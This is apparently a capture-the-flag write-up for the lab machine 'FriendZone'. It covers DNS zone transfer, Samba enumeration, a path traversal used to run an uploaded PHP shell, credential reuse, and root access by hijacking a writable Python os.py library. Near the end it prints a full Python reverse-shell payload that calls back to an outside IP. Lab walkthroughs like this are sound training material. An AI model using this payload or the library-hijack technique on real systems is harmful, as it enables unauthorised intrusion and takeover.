**Date**: 2026-05-03
**Difficulty**: Easy
**OS**: Linux
**Tags**: #dns-zone-transfer #samba #smb-enumeration #path-traversal #file-upload #rce #python-library-hijacking #cron #linpeas #pspy

## TL;DR

22/53/80/443 → DNS zone transfer (dig axfr) → 4 subdomains → Samba enumeration with creds (admin:WORKWORKHhallelujah@#) → /Development share writable → Path traversal in administrator1.friendzone.red/dashboard.php (pagename parameter) → uploaded shell.php via Samba → RCE as www-data → mysql_data.conf with friend:Agpyu12!0.213$ → SSH as friend → user.txt → pspy found root cron running reporter.py → Python library hijacking via writable os.py → root reverse shell → root.txt

## Recon

### Nmap

1. `sudo nmap -p- --min-rate=5000 -T4 10.129.181.217 -oN ports.txt` 
```
21/tcp  open  ftp  
22/tcp  open  ssh  
53/tcp  open  domain  
80/tcp  open  http  
139/tcp open  netbios-ssn  
443/tcp open  https  
445/tcp open  microsoft-ds
```
2. `sudo nmap -p21,22,53,80,139,443,445 -min-rate 5000 -T4 10.129.181.217 -oN detailed.txt`
```
21/tcp  open  ftp         vsftpd 3.0.3  
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)  
53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)  
| dns-nsid:    
|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu  
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))  
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)  
443/tcp open  ssl/http    Apache httpd 2.4.29  
|_http-title: FriendZone escape software  
| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO  
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)  
```

3. `sudo nmap -sU --top-ports 100 -T4 10.129.181.217
```
53/udp    open          domain
137/udp   open          netbios-ns

```
#### Interesting findings

- DNS  → potential hidden subdomains
- Samba (workgroup: WORKGROUP) → potential loot
- HTTPs with a certificate → potential hidden domain (added in /etc/hosts)
- Same web service available on HTTP & HTTPs  → they may be different

### Samba

1. `enum4linux -a 10.129.181.217
```
Looking up status of 10.129.181.217
        FRIENDZONE      <00> -         B <ACTIVE>  Workstation Service
        FRIENDZONE      <03> -         B <ACTIVE>  Messenger Service
        FRIENDZONE      <20> -         B <ACTIVE>  File Server Service
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

        MAC Address = 00-00-00-00-00-00

Domain Name: WORKGROUP
Domain Sid: (NULL SID)

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        Files           Disk      FriendZone Samba Server Files /etc/Files
        general         Disk      FriendZone Samba Server Files
        Development     Disk      FriendZone Samba Server Files
        IPC$            IPC       IPC Service (FriendZone server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            FRIENDZONE
        
//10.129.181.217/print$ Mapping: DENIED Listing: N/A Writing: N/A
//10.129.181.217/Files  Mapping: DENIED Listing: N/A Writing: N/A
//10.129.181.217/general        Mapping: OK Listing: OK Writing: N/A
//10.129.181.217/Development        Mapping: OK Listing: OK Writing: N/A
```
2. `smbclient //10.129.181.217/general -N` → creds.txt → **admin:WORKWORKHhallelujah@#**
3. /Development has no files
#### Interesting Findings

- FriendZone stores shares at /etc
- Received credentials may be useful
-  /Development allows uploading files to everybody

## Web
### friendzone (Web #1)

#### DNS

1. `dig axfr friendzone.red @10.129.181.217`
```
administrator1.friendzone.red. 604800 IN A      127.0.0.1  
hr.friendzone.red.      604800  IN      A       127.0.0.1  
uploads.friendzone.red. 604800  IN      A       127.0.0.1  
```

	I added found subdomains in /etc/hosts
#### HTTP

1. Default page (IP)
- Default web page with no buttons and any functions whatsoever (the domain part of the email at the bottom was added in /etc/hosts)
- `ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -u "http://10.129.181.217/FUZZ" -fc 404  -e .php,.js,.bak.,.txt`
```
wordpress               [Status: 301]
```
- In the directory of wordpress nothing was found

2. friendzone.red
- Domain `friendzone.red` looks like the default page
- ffuf found nothing
- `feroxbuster -u http://friendzone.red
```
301      GET        9l       28w      320c http://friendzone.red/wordpress => http://friendzone.red/wordpress/
200      GET       92l      454w    37253c http://friendzone.red/fz.jpg
200      GET       12l       31w      324c http://friendzone.red/
```
- /wordpress has nothing inside

3. administrator1.friendzone.red
-  Subdomain `administrator1` looks like the default page
- ffuf found nothing
- `feroxbuster -u http://administrator1.friendzone.red
```
301      GET        9l       28w      320c http://administrator1.friendzone.red/wordpress => http://friendzone.red/wordpress/
200      GET       92l      454w    37253c http://administrator1.friendzone.red/fz.jpg
200      GET       12l       31w      324c http://administrator1.friendzone.red/
```
- /wordpress has nothing inside

4. hr.friendzone.red
- Subdomain `hr` looks like the default page
- ffuf found nothing
- `feroxbuster -u http://hr.friendzone.red
```
301      GET        9l       28w      320c http://hr.friendzone.red/wordpress => http://friendzone.red/wordpress/
200      GET       92l      454w    37253c http://hr.friendzone.red/fz.jpg
200      GET       12l       31w      324c http://hr.friendzone.red/
```
- /wordpress has nothing inside

5. uploads.friendzone.red
- Subdomain `uploads` looks like the default page
- ffuf found nothing
- `feroxbuster -u http://uploads.friendzone.red
```
301      GET        9l       28w      320c http://uploads.friendzone.red/wordpress => http://friendzone.red/wordpress/
200      GET       92l      454w    37253c http://uploads.friendzone.red/fz.jpg
200      GET       12l       31w      324c http://uploads.friendzone.red/
```
- /wordpress has nothing inside
#### HTTPs

1. Default page (IP)
- Default page look like the default page of HTTP
- ffuf & feroxbuster found nothing

2. friendzone.red
- Domain `friendzone.red` has no buttons and no hints - just a gif and HTML text 
- ffuf found nothing
- `feroxbuster -u https://friendzone.red -k
```
 301      GET        9l       28w      318c https://friendzone.red/admin => https://friendzone.red/admin/
301      GET        9l       28w      315c https://friendzone.red/js => https://friendzone.red/js/
301      GET        9l       28w      318c https://friendzone.red/js/js => https://friendzone.red/js/js/
200      GET    14130l    86464w  3790022c https://friendzone.red/e.gif
200      GET       14l       30w      238c https://friendzone.red/
```
- /admin, /js has nothing inside

3. administrator1.friendzone.red
-  Subdomain `administrator1` default page is a login form
- ffuf found nothing
- `feroxbuster -u https://administrator1.friendzone.red -k
```
301      GET        9l       28w      349c https://administrator1.friendzone.red/images => https://administrator1.friendzone.red/images/
200      GET        1l        2w        7c https://administrator1.friendzone.red/login.php
200      GET      122l      307w     2873c https://administrator1.friendzone.red/
200      GET       57l      242w    20127c https://administrator1.friendzone.red/images/a.jpg
200      GET     1401l     8926w   726654c https://administrator1.friendzone.red/images/b.jpg
```
4. hr.friendzone.red
- Subdomain `hr` gives an Apache error 'Not Found'
- ffuf & feroxbuster found nothing

5. uploads.friendzone.red
-  Subdomain `uploads` has an upload form that accepts everything (not only images)
- `feroxbuster -u https://uploads.friendzone.red -k
```
200      GET        1l        8w       38c https://uploads.friendzone.red/upload.php
200      GET       13l       35w      391c https://uploads.friendzone.red/
301      GET        9l       28w      334c https://uploads.friendzone.red/files => https://uploads.friendzone.red/files/
```
- /files has nothing interesting

### friendzoneportal

#### DNS

1. `dig axfr friendzoneportal.red @10.129.181.217`
```
admin.friendzoneportal.red. 604800 IN   A       127.0.0.1
files.friendzoneportal.red. 604800 IN   A       127.0.0.1
imports.friendzoneportal.red. 604800 IN A       127.0.0.1
vpn.friendzoneportal.red. 604800 IN     A       127.0.0.1
```

	I added found subdomains in /etc/hosts
#### HTTP

1. friendzoneportal.red
- Domain  friendzoneportal.red has no default page
- ffuf & feroxbuster found nothing

2. admin.friendzoneportal.red
-  Subdomain `admin` has no default page
- `feroxbuster -u http://admin.friendzoneportal.red -k
```
200      GET       92l      454w    37253c http://admin.friendzoneportal.red/fz.jpg  
200      GET       12l       31w      324c http://admin.friendzoneportal.red/  
301      GET        9l       28w      344c http://admin.friendzoneportal.red/wordpress => http://admin.friendzoneportal.red/wordpress/  
```

3. files.friendzoneportal.red
- Subdomain `files` looks like the default page of HTTP
- ffuf found nothing
- `feroxbuster -u http://files.friendzoneportal.red/wordpress 
```
301      GET        9l       28w      344c http://files.friendzoneportal.red/wordpress => http://files.friendzoneportal.red/wordpress/  
200      GET       92l      454w    37253c http://files.friendzoneportal.red/fz.jpg  
200      GET       12l       31w      324c http://files.friendzoneportal.red/
```
- /wordpress has no nothing 

4. imports.friendzoneportal.red
- Subdomain `imports`looks like the default page of HTTP
- `feroxbuster -u http://imports.friendzoneportal.red 
```
200      GET       92l      454w    37253c http://imports.friendzoneportal.red/fz.jpg  
200      GET       12l       31w      324c http://imports.friendzoneportal.red/  
301      GET        9l       28w      348c http://imports.friendzoneportal.red/wordpress
```
- /wordpress has no nothing 

5. vpn.friendzoneportal.red
- Subdomain `vpn` looks like the default page of HTTP
- `feroxbuster -u http://vpn.friendzoneportal.red/wordpress 
```
200      GET       92l      454w    37253c http://vpn.friendzoneportal.red/fz.jpg
200      GET       12l       31w      324c http://vpn.friendzoneportal.red/
301      GET        9l       28w      340c http://vpn.friendzoneportal.red/wordpress
```
- /wordpress has no nothing 
#### HTTPs

1. friendzoneportal.red
- Domain  friendzoneportal.red has no default page
- ffuf & feroxbuster found nothing

2. admin.friendzoneportal.red
-  Subdomain `admin` has no default page
- `feroxbuster -u https://admin.friendzoneportal.red -k
```
200      GET        1l        1w        7c https://admin.friendzoneportal.red/login.php  
200      GET       17l       33w      379c https://admin.friendzoneportal.red/
```

3. files.friendzoneportal.red
- Subdomain `files` looks like the default page of HTTP
- ffuf & feroxbuster found nothing

4. imports.friendzoneportal.red
- Subdomain `imports`looks like the default page of HTTP
- ffuf & feroxbuster found nothing

5. vpn.friendzoneportal.red
- Subdomain `vpn` looks like the default page of HTTP
- ffuf & feroxbuster found nothing

## Path traversal & RCE

After I tried the credentials on `https://administrator1.friendzone.red/login.php` I manually visited `/dashboard.php`

According to the instructions, I can show an image with
`image_id=a.jpg&pagename=timestamp`

The `timestamp`, just like `image_id` part can be whatever we choose. Thus they may have a potential path traversal vulnerability.

Recalling the fact that I can upload files using samba, I uploaded `shell.php` to the `/Development` directory, and called it using `timestamp=/etc/Development/shell` since timestamp automatically adds `.php` to the end. 

```
$ cd home  
$ cd friend  
$ cat user.txt  
f1eb98db908497c670462c28c9dcdba0  

```

## Lateral Movement

Upon searching for configs, I found credentials for **friend:Agpyu12!0.213$** in `/var/www/mysql_data.conf`

I tried to connect to `friend` using SSH with received credentials and it worked out.

## Privilege Escalation via Python Library Injection

To find potential vulnerabilities I used linpeas.sh and pspy to save up time before starting rummaging in the system myself.

While linpeas.sh did not give anything interesting except for the groups I belong to (adm is the most interesting one but it does not have anything interesting that belong to it), pspy gave an interesting process working every 2-3 minutes in response - `reporter.py` at `/opt/server_admin`

```
/usr/bin/python /opt/server_admin/reporter.py 
2026/05/04 21:52:53 CMD: UID=0     PID=30879  | /bin/sh -c /opt/server_admin/reporter.py 
2026/05/04 21:52:53 CMD: UID=0     PID=30878  | /usr/sbin/CRON -f 
2026/05/04 21:52:53 CMD: UID=0     PID=30812  | 
```

Namely, python 2.7 runs reporter.py that has the following code: 
```
import os

to_address = "admin1@friendzone.com"
from_address = "admin2@friendzone.com"

print "[+] Trying to send email to %s"%to_address

#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''

#os.system(command)

# I need to edit the script later
# Sam ~ python developer
```

While the code is not injectable, the `os` library it uses could be.

After I checked for python's libraries I found os.py, where I injected a simple python reverse shell code.

```
import socket
import pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.17.151",666))
dup2(s.fileno(),0)
dup2(s.fileno(),1)
dup2(s.fileno(),2)
pty.spawn("/bin/bash")
```

```
root@FriendZone:~# cat root.txt
cat root.txt
76d3ecc199c60ed19625d222107ed3a3
root@FriendZone:~# 

```
